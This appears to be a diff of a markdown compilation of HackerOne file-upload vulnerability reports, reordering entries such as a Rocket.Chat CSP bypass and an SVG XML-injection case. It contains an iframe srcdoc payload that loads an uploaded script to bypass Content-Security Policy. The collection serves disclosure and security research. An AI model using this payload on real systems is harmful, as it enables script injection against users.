@@ -125,13 +125,6 @@ Accept-Language: zh-CN,zh;q=0.9
 ------WebKitFormBoundaryevPInYidBxSvSd06
 ```
 
-## #1380157 Content-Security Policy bypass with File Uploads — rocket_chat — - — None
-Source: `hackerone/reports/2024/1380157.md` (https://hackerone.com/reports/1380157)
-
-```
-<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">
-```
-
 ## #845832 SVG file upload leads to XML injection — lab45 — - — XML Injection
 Source: `hackerone/reports/2020/845832.md` (https://hackerone.com/reports/845832)
 
@@ -149,6 +142,13 @@ Source: `hackerone/reports/2020/845832.md` (https://hackerone.com/reports/845832
 ```
        with a token variable which is same as the token variable which we received in the first request. Also a variable "contentType" which is used in determining the extension of the file being uploaded. I changed the value to "image/svg+xml"
                                      F781767
+```
+
+## #1380157 Content-Security Policy bypass with File Uploads — rocket_chat — - — None
+Source: `hackerone/reports/2024/1380157.md` (https://hackerone.com/reports/1380157)
+
+```
+<iframe srcdoc="&#x3c;script src='/file-upload/<UPLOAD ID>/payload.js?download'></script>">
 ```
 
 ## #3765476 Unauthenticated File Upload with CORS Wildcard and No Rate Limiting on ████████ and ████████ — essity — - — Missing Authentication for Critical Function
